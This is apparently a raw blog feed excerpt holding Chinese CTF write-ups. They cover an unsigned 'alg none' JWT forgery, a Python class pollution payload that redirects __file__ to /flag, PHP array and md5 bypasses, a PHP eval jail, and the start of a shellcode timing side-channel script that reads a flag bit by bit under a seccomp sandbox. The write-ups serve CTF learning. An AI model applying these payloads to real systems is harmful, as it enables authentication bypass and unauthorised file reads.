punctuation">,</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"alg"</span><span class="token punctuation">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>  <span class="token string">"typ"</span><span class="token punctuation">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span><span class="token comment"># 使用 PyJWT 的 encode 方法</span>jwt_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token_dict<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>jwt_token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以<code>Bearer</code>方案发送认证数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># 假设你已经有了一个JWT</span>jwt_token <span class="token operator">=</span> <span class="token string">'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'</span><span class="token comment"># 目标URL</span>url <span class="token operator">=</span> <span class="token string">'http://challenge.basectf.fun:27209/flag'</span><span class="token comment"># 发送GET请求，将JWT放在Authorization头部中</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>jwt_token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># 检查响应</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Success:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="back-to-the-future"><a href="#back-to-the-future" class="headerlink" title="back to the future"></a>back to the future</h2><p><code>githacker</code>得到<code>git</code>源码直接<code>git show</code></p><h2 id="圣钥之战"><a href="#圣钥之战" class="headerlink" title="圣钥之战"></a>圣钥之战</h2><p>提升可以去<code>read</code>那里找一下<code>flag</code>，访问<code>/read</code>拿到源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/static/index.html'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> f"J1ngHong说：你想read flag吗？那么圣钥之光必将阻止你！但是小小的源码没事，因为你也读不到flag<span class="token punctuation">(</span>乐<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span>"<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/pollute'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Pollution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>instance<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"J1ngHong说：钥匙圣洁无暇，无人可以污染！"</span>    <span class="token keyword">return</span> <span class="token string">"J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>python</code>原型链污染<code>__file__</code>为<code>flag</code>，发送<code>post</code>数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"__init__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">"__globals__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">"__file__"</span><span class="token punctuation">:</span><span class="token string">"/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h2><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"错了！就你还想玩原神？❌❌❌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$tip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tip</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"我要玩原神"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我不管，我要玩原神！😭😭😭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"可恶的QQ人！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"100%"</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"love100%"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>  <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ii</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$ii</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ii</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token variable">$ii</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>len</code>数组的长度要和<code>array</code>一样，爆破<code>array</code>的长度为<code>45</code>，源码给出了<code>m</code>数组的内容</p><p>最后得到<code>flag</code>的数组，每一位进行<code>md5</code>，直接爆破<code>md5</code></p><p><code>php</code>的数组：<code>len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4</code>（拼接</p><p>爆破<code>md5</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlibmd5_array  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span><span class="token punctuation">,</span><span class="token string">"26657d5ff9020d2abefe558796b99584"</span><span class="token punctuation">,</span><span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span><span class="token string">"ec8956637a99787bd197eacd77acce5e"</span><span class="token punctuation">,</span><span class="token string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="token punctuation">,</span><span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">,</span><span class="token string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="token punctuation">,</span><span class="token string">"c8ffe9a587b126f152ed3d89a146b445"</span><span class="token punctuation">,</span><span class="token string">"072b030ba126b2f4b2374f342be9ed44"</span><span class="token punctuation">,</span><span class="token string">"c9e1074f5b3f9fc8ea15d152add07294"</span><span class="token punctuation">,</span><span class="token string">"093f65e080a295f8076b1c5722a46aa2"</span><span class="token punctuation">,</span><span class="token string">"66f041e16a60928b05a7e228a89c3799"</span><span class="token punctuation">,</span><span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span><span class="token string">"9a1158154dfa42caddbd0694a4e9bdc8"</span><span class="token punctuation">,</span><span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span><span class="token string">"a684eceee76fc522773286a895bc8436"</span><span class="token punctuation">,</span><span class="token string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="token punctuation">,</span><span class="token string">"eb160de1de89d9058fcb0b968dbbbd68"</span><span class="token punctuation">,</span><span class="token string">"c45147dee729311ef5b5c3003946c48f"</span><span class="token punctuation">,</span><span class="token string">"7f6ffaa6bb0b408017b62254211691b5"</span><span class="token punctuation">,</span><span class="token string">"07e1cd7dca89a1678042477183b7ac3f"</span><span class="token punctuation">,</span><span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span><span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span><span class="token string">"5ef059938ba799aaa845e1c2e8a762bd"</span><span class="token punctuation">,</span><span class="token string">"a1d0c6e83f027327d8461063f4ac58a6"</span><span class="token punctuation">,</span><span class="token string">"a1d0c6e83f027327d8461063f4ac58a6"</span><span class="token punctuation">,</span><span class="token string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="token punctuation">,</span><span class="token string">"a0a080f42e6f13b3a2df133f073095dd"</span><span class="token punctuation">,</span><span class="token string">"17e62166fc8586dfa4d1bc0e1742c08b"</span><span class="token punctuation">,</span><span class="token string">"3416a75f4cea9109507cacd8e2f2aefc"</span><span class="token punctuation">,</span><span class="token string">"a5771bce93e200c36f7cd9dfd0e5deaa"</span><span class="token punctuation">,</span><span class="token string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span><span class="token punctuation">,</span><span class="token string">"a3f390d88e4c41f2747bfa2f1b5f87db"</span><span class="token punctuation">,</span><span class="token string">"6f4922f45568161a8cdf4ad2299f6d23"</span><span class="token punctuation">,</span><span class="token string">"98f13708210194c475687be6106a3b84"</span><span class="token punctuation">,</span><span class="token string">"37693cfc748049e45d87b8c7d8b9aacd"</span><span class="token punctuation">,</span><span class="token string">"7cbbc409ec990f19c78c75bd1e06f215"</span><span class="token punctuation">,</span><span class="token string">"1f0e3dad99908345f7439f8ffabdffc4"</span><span class="token punctuation">,</span><span class="token string">"34173cb38f07f89ddbebc2ac9128303f"</span><span class="token punctuation">,</span><span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span><span class="token string">"35f4a8d465e6e1edc05f3d8ab658c551"</span><span class="token punctuation">,</span><span class="token string">"02e74f10e0327ad868d138f2b4fdd6f0"</span><span class="token punctuation">,</span><span class="token string">"d1fe173d08e959397adf34b1d77e88d7"</span><span class="token punctuation">,</span><span class="token string">"1f0e3dad99908345f7439f8ffabdffc4"</span><span class="token punctuation">,</span><span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>md5_array<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>j <span class="token operator">^</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h2><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token string">"hint.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$Jail <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'Jail_by.Happy'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$Jail <span class="token operator">==</span> null<span class="token punctuation">)</span> die<span class="token punctuation">(</span><span class="token string">"Do You Like My Jail?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>function Like_Jail<span class="token punctuation">(</span>$var<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/(`|\$|a|c|s|require|include)/i'</span><span class="token punctuation">,</span> $var<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Like_Jail<span class="token punctuation">(</span>$Jail<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">eval</span><span class="token punctuation">(</span>$Jail<span class="token punctuation">)</span><span class="token punctuation">;</span>    echo <span class="token string">"Yes! you escaped from the jail! LOL!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    echo <span class="token string">"You will Jail in your life!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>echo <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token operator">//</span> 在HTML解析后再输出PHP源代码?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行<code>hightlight_file</code>利用<code>glob</code>进行通配符查找</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;A-Dark-Room&quot;&gt;&lt;a href=&quot;#A-Dark-Room&quot; class=&quot;headerlink&quot; title=&quot;A Dark Room&quot;&gt;&lt;/a&gt;A Dark Room&lt;/h2&gt;&lt;p&gt;直接查看源代码，注释里有&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="web" scheme="https://starrysky1004.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>shellcode时间盲注</title>
    <link href="https://starrysky1004.github.io/2024/08/30/shellcode-shi-jian-mang-zhu/shellcode-shi-jian-mang-zhu/"/>
    <id>https://starrysky1004.github.io/2024/08/30/shellcode-shi-jian-mang-zhu/shellcode-shi-jian-mang-zhu/</id>
    <published>2024-08-29T17:17:54.000Z</published>
    <updated>2024-08-29T17:47:51.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>沙箱禁用<code>write</code>的时候可以通过<code>shellcode</code>逐位爆破，先将<code>flag</code>读到栈上，再依次爆破栈上每一位的内容，通过<code>cmp</code>比较的结果跳转到死循环，再根据接收数据的时间差判断是否进入死循环</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="遍历字符集"><a href="#遍历字符集" class="headerlink" title="遍历字符集"></a>遍历字符集</h3><p>在<code>flag</code>出现的字符种类较少的时候使用，直接<code>cmp</code>判断相同的时候跳到死循环，即<code>je</code>，此时字符集中的顺序会影响效率</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> charset<span class="token punctuation">:</span>        <span class="token keyword">global</span> r        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''            mov al, byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">]            cmp al, </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">            je $-2            ret        '''</span></span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'right'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time            li<span class="token punctuation">(</span><span class="token string">'time = '</span> <span class="token operator">+</span>  <span class="token builtin">str</span><span class="token punctuation">(</span>start_time<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">'char = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            r<span class="token 